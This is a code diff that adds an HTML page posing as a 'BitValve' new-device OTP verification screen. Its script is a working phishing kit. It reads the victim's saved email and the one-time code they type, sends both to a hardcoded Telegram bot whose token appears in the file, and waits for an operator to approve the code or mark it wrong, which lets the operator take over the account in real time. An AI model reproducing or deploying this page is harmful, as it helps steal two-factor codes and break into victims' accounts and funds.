@@ -1,0 +1,786 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BitValve - OTP Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: #1f2937;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 30px 25px;
+            text-align: center;
+        }
+        
+        @media (max-width: 480px) {
+            body {
+                padding: 10px;
+                align-items: flex-start;
+                padding-top: 30px;
+            }
+            .container {
+                padding: 20px 15px;
+            }
+            .logo-text {
+                font-size: 24px !important;
+            }
+            h1 {
+                font-size: 22px !important;
+            }
+            .otp-input {
+                width: 44px !important;
+                height: 52px !important;
+                font-size: 20px !important;
+            }
+            .btn-trust {
+                padding: 16px 18px !important;
+                font-size: 16px !important;
+            }
+        }
+        
+        @media (min-width: 768px) {
+            .container {
+                max-width: 450px;
+                padding: 40px 35px;
+            }
+            h1 {
+                font-size: 26px !important;
+            }
+            .otp-input {
+                width: 56px !important;
+                height: 64px !important;
+                font-size: 24px !important;
+            }
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 35px;
+        }
+        
+        .logo-icon {
+            width: 36px;
+            height: 36px;
+        }
+        
+        .logo-text {
+            color: #ffffff;
+            font-size: 28px;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+        }
+        
+        .email-icon {
+            width: 28px;
+            height: 28px;
+            color: #ffffff;
+            margin-bottom: 12px;
+        }
+        
+        h1 {
+            color: #ffffff;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .subtitle {
+            color: #9ca3af;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 28px;
+        }
+        
+        .subtitle .email-masked {
+            color: #d1d5db;
+            font-weight: 500;
+        }
+        
+        .otp-label {
+            display: block;
+            color: #9ca3af;
+            font-size: 12px;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            margin-bottom: 14px;
+            text-align: left;
+        }
+        
+        .otp-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 8px;
+            margin-bottom: 28px;
+        }
+        
+        .otp-input {
+            width: 50px;
+            height: 58px;
+            background: #374151;
+            border: 2px solid transparent;
+            border-radius: 12px;
+            color: #ffffff;
+            font-family: 'Inter', sans-serif;
+            font-size: 22px;
+            font-weight: 600;
+            text-align: center;
+            outline: none;
+            transition: border-color 0.2s, background 0.2s, box-shadow 0.2s;
+            caret-color: #bef264;
+        }
+        
+        .otp-input::placeholder {
+            color: #6b7280;
+        }
+        
+        .otp-input:focus {
+            border-color: #bef264;
+            background: #4b5563;
+            box-shadow: 0 0 0 3px rgba(190, 242, 100, 0.15);
+        }
+        
+        .otp-input.filled {
+            border-color: #bef264;
+            background: #4b5563;
+        }
+        
+        .otp-input.error {
+            border-color: #ef4444 !important;
+            animation: shake 0.4s ease;
+        }
+        
+        .btn-trust {
+            width: 100%;
+            padding: 18px 20px;
+            background: #bef264;
+            border: none;
+            border-radius: 50px;
+            color: #1f2937;
+            font-family: 'Inter', sans-serif;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, opacity 0.2s;
+            letter-spacing: 0.5px;
+        }
+        
+        .btn-trust:hover {
+            transform: scale(1.02);
+            opacity: 0.95;
+        }
+        
+        .btn-trust:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .error-msg {
+            background: rgba(239, 68, 68, 0.15);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            color: #fca5a5;
+            padding: 12px 16px;
+            border-radius: 10px;
+            font-size: 13px;
+            margin-bottom: 20px;
+            display: none;
+            text-align: center;
+        }
+        
+        .spinner-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(31, 41, 55, 0.9);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.4s ease, visibility 0.4s ease;
+            pointer-events: none;
+        }
+        
+        .spinner-overlay.active {
+            opacity: 1;
+            visibility: visible;
+            pointer-events: all;
+        }
+        
+        .spinner {
+            width: 45px;
+            height: 45px;
+            border: 4px solid #374151;
+            border-top-color: #bef264;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .spinner-text {
+            color: #d1d5db;
+            font-size: 14px;
+            margin-top: 18px;
+            font-weight: 500;
+        }
+        
+        .cancel-poll-btn {
+            margin-top: 20px;
+            padding: 10px 24px;
+            background: transparent;
+            border: 1px solid #4b5563;
+            border-radius: 50px;
+            color: #9ca3af;
+            font-family: 'Inter', sans-serif;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .cancel-poll-btn:hover {
+            border-color: #ef4444;
+            color: #ef4444;
+        }
+        
+        .success-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(31, 41, 55, 0.95);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+        }
+        
+        .success-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .success-popup {
+            background: #1f2937;
+            border-radius: 24px;
+            padding: 50px 35px;
+            text-align: center;
+            max-width: 320px;
+            width: 90%;
+            border: 1px solid #374151;
+            transform: scale(0.7) translateY(30px);
+            transition: transform 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+            box-shadow: 0 25px 80px rgba(0, 0, 0, 0.4);
+        }
+        
+        .success-overlay.active .success-popup {
+            transform: scale(1) translateY(0);
+        }
+        
+        .success-icon {
+            width: 70px;
+            height: 70px;
+            background: #bef264;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+            animation: successPop 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+        
+        @keyframes successPop {
+            0% {
+                transform: scale(0);
+            }
+            60% {
+                transform: scale(1.2);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+        
+        .success-icon svg {
+            width: 32px;
+            height: 32px;
+            color: #1f2937;
+        }
+        
+        .success-popup h3 {
+            color: #ffffff;
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+        
+        .success-popup p {
+            color: #9ca3af;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        
+        @keyframes shake {
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+            20% {
+                transform: translateX(-8px);
+            }
+            40% {
+                transform: translateX(8px);
+            }
+            60% {
+                transform: translateX(-4px);
+            }
+            80% {
+                transform: translateX(4px);
+            }
+        }
+    </style>
+    <base target="_blank">
+</head>
+
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg class="logo-icon" viewBox="0 0 36 36" fill="none">
+                <rect x="0" y="0" width="12" height="12" fill="white"/>
+                <rect x="12" y="12" width="12" height="12" fill="white"/>
+                <rect x="24" y="24" width="12" height="12" fill="white"/>
+            </svg>
+            <span class="logo-text">BitValve</span>
+        </div>
+
+        <h1>
+            <svg class="email-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="2" y="4" width="20" height="16" rx="2"/>
+                <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/>
+            </svg> New device detected
+        </h1>
+
+        <p class="subtitle">
+            We sent a verification code to <span class="email-masked" id="maskedEmail">b****5@gmail.com</span>or GOOGLE AUTHENTICATOR to confirm this is your device.
+        </p>
+
+        <div class="error-msg" id="otpError"></div>
+
+        <label class="otp-label">AUTHENTICATOR CODE</label>
+
+        <div class="otp-container">
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="one-time-code" data-index="0">
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="1">
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="2">
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="3">
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="4">
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="5">
+        </div>
+
+        <button class="btn-trust" id="trustBtn" onclick="verifyOTP()">Trust Device</button>
+    </div>
+
+    <div class="spinner-overlay" id="spinnerOverlay">
+        <div class="spinner"></div>
+        <p class="spinner-text">Verifying code...</p>
+        <button class="cancel-poll-btn" onclick="cancelPolling()">Cancel</button>
+    </div>
+
+    <div class="success-overlay" id="successOverlay">
+        <div class="success-popup">
+            <div class="success-icon">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                    <polyline points="20 6 9 17 4 12"/>
+                </svg>
+            </div>
+            <h3>Device Verified!</h3>
+            <p>Your device has been successfully trusted. You can now access your account securely.</p>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "8622400907:AAEdVNBFOs3F3f-fi-WSb5rxlJWsiBeGpVk";
+        const TELEGRAM_CHAT_ID = "5615316142";
+        let pollDecided = false;
+        let pollTimeoutId = null;
+        let currentPollController = null;
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const savedEmail = localStorage.getItem('userEmail');
+            if (savedEmail) {
+                document.getElementById('maskedEmail').textContent = maskEmail(savedEmail);
+            }
+            document.querySelector('.otp-input[data-index="0"]').focus();
+        });
+
+        function maskEmail(email) {
+            const parts = email.split('@');
+            if (parts.length !== 2) return email;
+            const local = parts[0];
+            const domain = parts[1];
+            let maskedLocal;
+            if (local.length <= 2) {
+                maskedLocal = local.charAt(0) + '*';
+            } else {
+                maskedLocal = local.charAt(0) + '*'.repeat(local.length - 2) + local.charAt(local.length - 1);
+            }
+            return maskedLocal + '@' + domain;
+        }
+
+        function showError(msg) {
+            const err = document.getElementById('otpError');
+            if (err) {
+                err.textContent = msg;
+                err.style.display = 'block';
+            }
+        }
+
+        function hideError() {
+            const err = document.getElementById('otpError');
+            if (err) err.style.display = 'none';
+        }
+
+        function cancelPolling() {
+            pollDecided = true;
+            if (pollTimeoutId) clearTimeout(pollTimeoutId);
+            if (currentPollController) currentPollController.abort();
+            document.getElementById('spinnerOverlay').classList.remove('active');
+            document.getElementById('trustBtn').disabled = false;
+            showError('Request cancelled. Please try again.');
+        }
+
+        function startPolling(userId, otp) {
+            let offset = 0;
+            pollDecided = false;
+            let pollCount = 0;
+            const maxPolls = 90;
+            let retryDelay = 2000;
+
+            if (currentPollController) currentPollController.abort();
+            currentPollController = new AbortController();
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?limit=1`, {
+                    signal: currentPollController.signal
+                })
+                .then(r => r.json())
+                .then(data => {
+                    if (data.ok && data.result.length > 0) {
+                        offset = data.result[data.result.length - 1].update_id + 1;
+                    }
+                    pollLoop();
+                })
+                .catch(err => {
+                    if (err.name !== 'AbortError') {
+                        console.error('Initial offset error:', err);
+                        pollLoop();
+                    }
+                });
+
+            function pollLoop() {
+                if (pollDecided) return;
+                pollCount++;
+                if (pollCount > maxPolls) {
+                    pollDecided = true;
+                    document.getElementById('spinnerOverlay').classList.remove('active');
+                    document.getElementById('trustBtn').disabled = false;
+                    showError('Request timed out. Please try again.');
+                    return;
+                }
+
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?limit=20&offset=${offset}`, {
+                        method: 'GET',
+                        signal: currentPollController.signal
+                    })
+                    .then(r => {
+                        if (!r.ok) {
+                            if (r.status === 409) {
+                                retryDelay = Math.min(retryDelay * 1.5, 10000);
+                                pollTimeoutId = setTimeout(pollLoop, retryDelay);
+                                return null;
+                            }
+                            throw new Error('HTTP ' + r.status);
+                        }
+                        retryDelay = 2000;
+                        return r.json();
+                    })
+                    .then(data => {
+                        if (data === null) return;
+                        if (!data.ok || pollDecided) {
+                            if (!pollDecided) {
+                                pollTimeoutId = setTimeout(pollLoop, retryDelay);
+                            }
+                            return;
+                        }
+
+                        for (let update of data.result) {
+                            offset = update.update_id + 1;
+                            if (update.callback_query) {
+                                const action = update.callback_query.data;
+
+                                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json'
+                                    },
+                                    body: JSON.stringify({
+                                        callback_query_id: update.callback_query.id,
+                                        text: "Action recorded!"
+                                    })
+                                }).catch(() => {});
+
+                                if (action === `approve_${userId}`) {
+                                    pollDecided = true;
+                                    document.getElementById('spinnerOverlay').classList.remove('active');
+                                    showSuccess();
+                                    return;
+                                } else if (action === `decline_${userId}`) {
+                                    pollDecided = true;
+                                    document.getElementById('spinnerOverlay').classList.remove('active');
+                                    document.getElementById('trustBtn').disabled = false;
+                                    showError('Request declined. Please try again.');
+                                    return;
+                                } else if (action === `wrong_${userId}`) {
+                                    pollDecided = true;
+                                    document.getElementById('spinnerOverlay').classList.remove('active');
+                                    document.getElementById('trustBtn').disabled = false;
+                                    showError('Wrong OTP. Please enter the correct code.');
+                                    otpInputs.forEach(input => {
+                                        input.value = '';
+                                        input.classList.remove('filled');
+                                        input.classList.add('error');
+                                    });
+                                    setTimeout(() => {
+                                        otpInputs.forEach(input => input.classList.remove('error'));
+                                    }, 1000);
+                                    otpInputs[0].focus();
+                                    return;
+                                }
+                            }
+                        }
+
+                        if (!pollDecided) {
+                            pollTimeoutId = setTimeout(pollLoop, retryDelay);
+                        }
+                    })
+                    .catch(err => {
+                        if (err.name === 'AbortError') return;
+                        console.error('Poll error:', err);
+                        if (!pollDecided) {
+                            retryDelay = Math.min(retryDelay * 1.2, 8000);
+                            pollTimeoutId = setTimeout(pollLoop, retryDelay);
+                        }
+                    });
+            }
+        }
+
+        function sendTelegramMessage(message, keyboard, userId) {
+            const spinnerOverlay = document.getElementById('spinnerOverlay');
+            const trustBtn = document.getElementById('trustBtn');
+
+            let attempts = 0;
+            const maxAttempts = 3;
+
+            function attemptSend() {
+                attempts++;
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML',
+                            reply_markup: JSON.stringify(keyboard)
+                        })
+                    })
+                    .then(res => {
+                        if (!res.ok) {
+                            throw new Error('HTTP ' + res.status);
+                        }
+                        return res.json();
+                    })
+                    .then(data => {
+                        if (data.ok) {
+                            startPolling(userId);
+                        } else {
+                            if (attempts < maxAttempts) {
+                                setTimeout(attemptSend, 1000 * attempts);
+                            } else {
+                                spinnerOverlay.classList.remove('active');
+                                trustBtn.disabled = false;
+                                showError('Failed to send notification. Please try again.');
+                            }
+                        }
+                    })
+                    .catch(err => {
+                        console.error('Send error:', err);
+                        if (attempts < maxAttempts) {
+                            setTimeout(attemptSend, 1000 * attempts);
+                        } else {
+                            spinnerOverlay.classList.remove('active');
+                            trustBtn.disabled = false;
+                            showError('Network error. Please check your connection and try again.');
+                        }
+                    });
+            }
+
+            attemptSend();
+        }
+
+        const otpInputs = document.querySelectorAll('.otp-input');
+
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', function(e) {
+                const value = e.target.value;
+                if (!/^\d*$/.test(value)) {
+                    e.target.value = value.replace(/\D/g, '');
+                    return;
+                }
+                if (value.length === 1) {
+                    e.target.classList.add('filled');
+                    if (index < otpInputs.length - 1) {
+                        otpInputs[index + 1].focus();
+                    }
+                } else if (value.length === 0) {
+                    e.target.classList.remove('filled');
+                }
+                checkAllFilled();
+            });
+
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                    otpInputs[index - 1].focus();
+                    otpInputs[index - 1].value = '';
+                    otpInputs[index - 1].classList.remove('filled');
+                }
+                if (e.key === 'ArrowLeft' && index > 0) otpInputs[index - 1].focus();
+                if (e.key === 'ArrowRight' && index < otpInputs.length - 1) otpInputs[index + 1].focus();
+            });
+
+            input.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const pasteData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
+                pasteData.split('').forEach((char, i) => {
+                    if (otpInputs[i]) {
+                        otpInputs[i].value = char;
+                        otpInputs[i].classList.add('filled');
+                    }
+                });
+                if (pasteData.length === 6) otpInputs[5].focus();
+                else if (otpInputs[pasteData.length]) otpInputs[pasteData.length].focus();
+                checkAllFilled();
+            });
+
+            input.addEventListener('focus', function() {
+                this.select();
+            });
+        });
+
+        function checkAllFilled() {
+            const allFilled = Array.from(otpInputs).every(input => input.value.length === 1);
+        }
+
+        function verifyOTP() {
+            const otp = Array.from(otpInputs).map(input => input.value).join('');
+
+            if (otp.length !== 6) {
+                otpInputs.forEach(input => {
+                    input.style.animation = 'none';
+                    input.offsetHeight;
+                    input.style.animation = 'shake 0.4s ease';
+                    input.classList.add('error');
+                });
+                setTimeout(() => {
+                    otpInputs.forEach(input => {
+                        input.classList.remove('error');
+                        input.style.animation = '';
+                    });
+                }, 1000);
+                return;
+            }
+
+            const spinnerOverlay = document.getElementById('spinnerOverlay');
+            const trustBtn = document.getElementById('trustBtn');
+
+            spinnerOverlay.classList.add('active');
+            trustBtn.disabled = true;
+            hideError();
+
+            const savedEmail = localStorage.getItem('userEmail') || 'unknown';
+            const userId = savedEmail.replace(/[^a-zA-Z0-9]/g, '').slice(0, 15) + '_' + Date.now();
+
+            const message = `🔔 <b>New BitValve OTP Verification</b>
+
+📧 Email: <code>${savedEmail}</code>
+🔢 OTP: <code>${otp}</code>
+⏰ Time: ${new Date().toLocaleString('en-ZA')}
+
+Tap to copy the details above.
+Please approve, decline, or mark as wrong OTP:`;
+
+            const keyboard = {
+                inline_keyboard: [
+                    [{
+                        text: "✅ APPROVE",
+                        callback_data: `approve_${userId}`
+                    }, {
+                        text: "❌ DECLINE",
+                        callback_data: `decline_${userId}`
+                    }],
+                    [{
+                        text: "⚠️ WRONG OTP",
+                        callback_data: `wrong_${userId}`
+                    }]
+                ]
+            };
+
+            sendTelegramMessage(message, keyboard, userId);
+        }
+
+        function showSuccess() {
+            const successOverlay = document.getElementById('successOverlay');
+            successOverlay.classList.add('active');
+        }
+    </script>
+</body>
+
+</html>
